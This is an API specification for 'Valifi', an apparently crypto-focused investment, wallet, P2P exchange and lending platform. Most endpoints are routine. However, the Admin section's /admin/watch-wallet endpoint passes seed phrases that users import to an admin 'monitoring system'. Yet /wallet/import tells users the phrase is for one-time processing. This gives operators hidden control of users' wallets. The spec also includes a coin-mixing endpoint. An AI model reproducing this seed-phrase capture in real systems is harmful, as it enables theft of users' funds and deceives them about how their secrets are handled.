# Valifi Platform API Specification

This document outlines the API endpoints for the Valifi platform, designed for seamless integration between the backend services and the React frontend.

## Table of Contents
1.  [General Information](#1-general-information)
2.  [Authentication & User](#2-authentication--user)
3.  [Dashboard](#3-dashboard)
4.  [Investments & Portfolio](#4-investments--portfolio)
5.  [Funds Management](#5-funds-management)
6.  [P2P Exchange](#6-p2p-exchange)
7.  [Hybrid Wallet](#7-hybrid-wallet)
8.  [Valifi Cards](#8-valifi-cards)
9.  [Banking](#9-banking)
10. [Loans](#10-loans)
11. [Compliance & Other Services](#11-compliance--other-services)
12. [AI Services](#12-ai-services)
13. [Notifications](#13-notifications)
14. [Career Applications](#14-career-applications)
15. [Admin](#15-admin)


---

## 1. General Information

*   **Base URL**: `/api` (e.g., `/api/auth/login`)
*   **Authentication**: Most endpoints require a JSON Web Token (JWT) to be passed in the `Authorization` header.
    `Authorization: Bearer <your_jwt_token>`
*   **Response Format**: All responses are in JSON. A standard success response includes a `status` field.
    ```json
    {
      "status": "success",
      "data": { ... } 
    }
    ```
*   **Error Format**: Errors return a `4xx` or `5xx` status code.
    ```json
    {
      "status": "error",
      "message": "A description of the error."
    }
    ```

---

## 2. Authentication & User

### `POST /auth/register`
*   **Description**: Registers a new user.
*   **Authentication**: None.
*   **Request Body**: `{ "fullName": "...", "username": "...", "email": "...", "password": "..." }`
*   **Response (`201 Created`)**: `{ "status": "success", "message": "Registration successful. Please verify your email." }`

### `POST /auth/login`
*   **Description**: Authenticates a user and returns JWTs.
*   **Authentication**: None.
*   **Request Body**: `{ "email": "...", "password": "..." }`
*   **Response (`200 OK`)**: `{ "status": "success", "token": "...", "refreshToken": "..." }`

### `GET /users/me`
*   **Description**: Fetches the complete settings and profile for the currently authenticated user.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: The full `UserSettings` object from `types.ts`.

### `PUT /users/me/settings`
*   **Description**: Updates the user's settings.
*   **Authentication**: JWT required.
*   **Request Body**: A partial or full `UserSettings` object.
*   **Response (`200 OK`)**: The complete, updated `UserSettings` object.

---

## 3. Dashboard

### `GET /dashboard`
*   **Description**: Fetches aggregated data required for the main dashboard view.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: 
    ```json
    {
      "status": "success",
      "data": {
        "portfolio": { "...Portfolio object..." },
        "notifications": [ "...Notification objects..." ],
        "userActivity": [ "...UserActivity objects..." ],
        "newsItems": [ "...NewsItem objects..." ]
      }
    }
    ```

---

## 4. Investments & Portfolio

### `GET /investments`
*   **Description**: Retrieves a list of all the user's current investments.
*   **Authentication**: JWT required.
*   **Query Params**: `?type=stock|crypto|reit|nft&status=active|matured`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "investments": [ "...Asset objects..." ] } }`

### `POST /investments/spectrum-plan`
*   **Description**: Creates a new investment in a Spectrum Equity Plan.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "planId": "corestart", "amount": 1000 }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "newInvestment": { "...Asset object..." }, "updatedPortfolio": { "...Portfolio object..." } } }`

### `POST /investments/stake-crypto`
*   **Description**: Stakes a crypto asset.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "assetId": "eth", "amount": 5000, "duration": 90, "payoutDestination": "balance" }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "newInvestment": { "...Asset object..." } } }`

### `POST /investments/stake-stock`
*   **Description**: Stakes a stock asset.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "stockTicker": "AAPL", "amount": 10000 }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "newInvestment": { "...Asset object..." } } }`

### `POST /investments/reit`
*   **Description**: Invests in a Real Estate Investment Trust property.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "propertyId": "reit-1", "amount": 10000 }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "newInvestment": { "...Asset object..." } } }`

### `POST /investments/nft-fractional`
*   **Description**: Invests in a fractional NFT.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "nftId": "inft-1", "amount": 500, "paymentMethod": "funds" }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "updatedInvestment": { "...Asset object..." } } }`

### `POST /investments/{id}/transfer-maturity`
*   **Description**: Transfers a matured investment's value to the main cash balance.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "updatedPortfolio": { "...Portfolio object..." } } }`

### `POST /investments/swap`
*   **Description**: Swaps one crypto/fiat asset for another.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "fromTicker": "BTC", "toTicker": "ETH", "fromAmount": 0.5 }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "updatedPortfolio": { "...Portfolio object..." } } }`

---

## 5. Funds Management

### `POST /funds/deposit-intent`
*   **Description**: Initiates a deposit and returns the necessary details.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "type": "crypto" | "fiat", "assetTicker": "BTC", "network": "Bitcoin" }`
*   **Response (`201 Created`)**: 
    *   Crypto: `{ "depositAddress": "..." }`
    *   Fiat: `{ "bankDetails": { "beneficiary": "...", "reference": "VLF-123" } }`

### `POST /funds/withdraw-request`
*   **Description**: Submits a withdrawal request for admin approval.
*   **Authentication**: JWT required (and 2FA if enabled).
*   **Request Body**: `{ "type": "crypto" | "fiat", "amountUSD": 1000, "destination": "..." }`
*   **Response (`202 Accepted`)**: `{ "status": "success", "message": "Withdrawal request submitted for review." }`

### `POST /funds/internal-transfer`
*   **Description**: Instantly transfers funds to another Valifi user.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "recipientIdentifier": "...", "amountUSD": 50.00, "note": "..." }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "updatedPortfolio": { "..." } } }`

---

## 6. P2P Exchange

### `GET /p2p/offers`
*   **Description**: Retrieves a list of available P2P offers based on filters.
*   **Authentication**: JWT required.
*   **Query Params**: `?type=buy|sell&asset=BTC&fiat=USD&paymentMethod=...`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "offers": [ "...P2POffer objects..." ] } }`

### `POST /p2p/offers`
*   **Description**: Creates a new P2P offer to buy or sell an asset.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "type": "BUY"|"SELL", "assetTicker": "BTC", "fiatCurrency": "USD", "priceType": "FIXED"|"FLOATING", "price": 68000, "floatingMargin": 1.5, "totalAmount": 0.5, "minOrder": 500, "maxOrder": 25000, "paymentMethodIds": ["..."], "paymentTimeLimitMinutes": 15, "terms": "..." }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "offer": { "...P2POffer object..." } } }`

### `POST /p2p/orders`
*   **Description**: Starts a trade by accepting an existing offer.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "offerId": "...", "amount": 500, "paymentMethodId": "..." }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "trade": { "...P2POrder object..." } } }`

### `POST /p2p/orders/{id}/confirm-payment`
*   **Description**: The buyer marks the order as paid.
*   **Authentication**: JWT required (must be buyer).
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "trade": { "...updated P2POrder..." } } }`

### `POST /p2p/orders/{id}/release-escrow`
*   **Description**: The seller confirms payment and releases the escrowed crypto.
*   **Authentication**: JWT required (must be seller).
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "trade": { "...updated P2POrder..." }, "updatedPortfolio": { "..." } } }`

### `POST /p2p/orders/{id}/chat`
*   **Description**: Sends a message in the trade chat.
*   **Authentication**: JWT required (must be buyer or seller).
*   **Request Body**: `{ "text": "...", "imageUrl": "..." }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "message": { "...P2PChatMessage object..." } } }`

### `POST /p2p/orders/{id}/dispute`
*   **Description**: Raises a dispute for an order.
*   **Authentication**: JWT required (must be buyer or seller).
*   **Request Body**: `{ "reason": "..." }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "trade": { "...updated P2POrder with dispute..." } } }`

### `POST /p2p/orders/{id}/review`
*   **Description**: Submits a review for a completed order.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "rating": 5, "comment": "..." }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "trade": { "...updated P2POrder with review..." } } }`

### `GET /p2p/payment-methods`
*   **Description**: Retrieves the user's saved P2P payment methods.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "paymentMethods": [ "...PaymentMethod objects..." ] } }`

### `POST /p2p/payment-methods`
*   **Description**: Adds a new P2P payment method.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "methodType": "...", "nickname": "...", "country": "...", "details": { "..." } }`
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "paymentMethod": { "...PaymentMethod object..." } } }`

### `DELETE /p2p/payment-methods/{id}`
*   **Description**: Deletes a P2P payment method.
*   **Authentication**: JWT required.
*   **Response (`204 No Content`)**

---

## 7. Hybrid Wallet

### `GET /wallet/assets`
*   **Description**: Retrieves all assets within the user's hybrid wallet.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "assets": [ "...HybridWalletAsset objects..." ] } }`

### `POST /wallet/create`
*   **Description**: Generates a new self-custody wallet for the user.
*   **Authentication**: JWT required.
*   **Response (`201 Created`)**: `{ "status": "success", "data": { "secretPhrase": "...", "assets": [ "..." ] } }`

### `POST /wallet/import`
*   **Description**: Imports an external wallet using a secret phrase. **Note**: The seed phrase is sent for one-time processing and is never stored plaintext.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "secretPhrase": "...", "source": "Trust Wallet" }`
*   **Response (`200 OK`)**: `{ "status": "success", "message": "Wallet imported successfully." }`

### `POST /wallet/send`
*   **Description**: Executes a transaction from the user's wallet.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "assetTicker": "ETH", "network": "ERC-20", "amountCrypto": 1.5, "destinationAddress": "..." }`
*   **Response (`202 Accepted`)**: `{ "status": "success", "data": { "transaction": { "...Transaction object..." } } }`

---

## 8. Valifi Cards

### `GET /cards/details`
*   **Description**: Fetches the user's current card status and details.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: The `CardDetails` object.

### `POST /cards/apply`
*   **Description**: Submits an application for a new card.
*   **Authentication**: JWT required.
*   **Request Body**: The `CardApplicationData` object.
*   **Response (`202 Accepted`)**: `{ "status": "success", "data": { "cardDetails": { "...updated CardDetails object..." } } }`

### `POST /cards/freeze`
*   **Description**: Freezes or unfreezes the user's card.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "freeze": true }`
*   **Response (`200 OK`)**: The updated `CardDetails` object.

---

## 9. Banking

### `GET /banking/accounts`
*   **Description**: Retrieves all linked bank accounts for the user.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: An array of `BankAccount` objects.

### `POST /banking/accounts`
*   **Description**: Links a new bank account and submits it for verification.
*   **Authentication**: JWT required.
*   **Request Body**: `multipart/form-data` containing account details and a verification document (e.g., bank statement).
*   **Response (`202 Accepted`)**: The newly created `BankAccount` object with `status: 'Pending'`.

### `DELETE /banking/accounts/{id}`
*   **Description**: Deletes a linked bank account.
*   **Authentication**: JWT required.
*   **Response (`204 No Content`)**

---

## 10. Loans

### `GET /loans`
*   **Description**: Retrieves all of the user's past and present loan applications.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: An array of `LoanApplication` objects.

### `POST /loans/apply`
*   **Description**: Submits a new loan application for review.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "amount": 100000, "term": 180, "collateralAssetId": "...", "reason": "..." }`
*   **Response (`202 Accepted`)**: The newly created `LoanApplication` object with `status: 'Pending'`.

### `POST /loans/{id}/repay`
*   **Description**: Makes a payment towards an active loan.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "paymentAmount": 5250.00 }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "loan": { "...updated LoanApplication..." }, "updatedPortfolio": { "..." } } }`

---

## 11. Compliance & Other Services

### `GET /kyc/status`
*   **Description**: Fetches the user's current KYC status.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "Approved", "rejectionReason": null }`

### `POST /kyc/submit`
*   **Description**: Submits documents for KYC verification.
*   **Authentication**: JWT required.
*   **Request Body**: `multipart/form-data` with identity document and selfie.
*   **Response (`202 Accepted`)**: `{ "status": "success", "message": "Documents submitted for review." }`

### `GET /tax/summary`
*   **Description**: Retrieves a summary of taxable events for a given year.
*   **Authentication**: JWT required.
*   **Query Params**: `?year=2024`
*   **Response (`200 OK`)**: `{ "realizedGains": ..., "realizedLosses": ..., "netResult": ... }`

### `GET /referrals/summary`
*   **Description**: Retrieves referral statistics and activity.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "totalReferrals": ..., "totalEarnings": ..., "referralTree": { "..." }, "activity": [ "..." ] }`

### `POST /privacy/mix`
*   **Description**: Initiates a new privacy mix transaction.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "assetTicker": "BTC", "network": "Bitcoin", "amount": 0.5, "destinationAddress": "...", "privacyLevel": 75 }`
*   **Response (`201 Created`)**: The `MixTransaction` object with `status: 'Awaiting Deposit'`.

---

## 12. AI Services

### `POST /ai/copilot`
*   **Description**: Sends a message to the Valifi Co-Pilot AI.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "message": "...", "currentView": "dashboard" }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "response": { "text": "...", "suggestions": [ "..." ] } } }`

### `POST /ai/tax-advisor`
*   **Description**: Asks a question to the AI Tax Assistant.
*   **Authentication**: JWT required.
*   **Request Body**: `{ "question": "..." }`
*   **Response (`200 OK`)**: `{ "status": "success", "data": { "response": "..." } }`

---

## 13. Notifications

### `POST /notifications/{id}/read`
*   **Description**: Marks a specific notification as read.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "success" }`

### `DELETE /notifications/{id}`
*   **Description**: Deletes/dismisses a specific notification.
*   **Authentication**: JWT required.
*   **Response (`204 No Content`)**

### `POST /notifications/read-all`
*   **Description**: Marks all unread notifications as read.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "success" }`

### `POST /notifications/clear-all`
*   **Description**: Deletes all notifications that have been read.
*   **Authentication**: JWT required.
*   **Response (`200 OK`)**: `{ "status": "success" }`

---

## 14. Career Applications

### `POST /careers/apply`
*   **Description**: Submits a job application.
*   **Authentication**: None.
*   **Request Body**: `multipart/form-data` containing name, email, expertise, cover letter, and resume file.
*   **Response (`202 Accepted`)**: `{ "status": "success", "message": "Application received. We will be in touch." }`

---

## 15. Admin

Endpoints for platform administration. Require JWT with an **admin** scope.

*   **`POST /admin/kyc/review`**: Approve or reject a KYC submission.
*   **`POST /admin/loans/review`**: Approve or reject a loan application.
*   **`GET /admin/users`**: List all users.
*   **`POST /admin/reits/add`**: Add a new REIT property.
*   **`POST /admin/watch-wallet`**: Adds an imported seed phrase to a secure admin monitoring system for tracking purposes. This endpoint is for internal use only and should not be exposed to regular users. The seed phrase is never stored plaintext.
